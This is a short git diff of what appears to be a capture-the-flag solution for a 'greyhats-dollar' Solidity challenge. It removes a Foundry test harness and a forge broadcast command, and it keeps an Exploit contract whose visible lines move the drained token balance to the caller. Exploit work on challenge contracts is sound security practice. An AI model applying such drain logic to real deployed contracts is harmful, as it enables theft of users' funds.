@@ -1,22 +1,7 @@
 // SPDX-License-Identifier: UNLICENSED
-pragma solidity ^0.8.13;
+pragma solidity 0.8.15;
 
-import {Test, console2} from "forge-std/Test.sol";
-import {Setup} from "src/greyhats-dollar/Setup.sol";
-
-contract KankoduTest is Test {
-    Setup setup;
-    
-    function setUp() public {
-        setup = Setup(0xa226af83F82b0b1CD656Db7085373F2bBdEf3B46);
-    }
-
-    function test_solve() public {
-        Exploit e = new Exploit(setup);
-        e.solve();
-        assertTrue(setup.isSolved());
-    }
-}
+import { Setup } from "./Setup.sol";
 
 contract Exploit {
     Setup setup;
@@ -44,5 +29,3 @@ contract Exploit {
         setup.ghd().transfer(msg.sender, balance);
     }
 }
-
-// forge script script/Solve.s.sol:Solution --rpc-url <rpc_url> --private-key <private_key> --broadcast
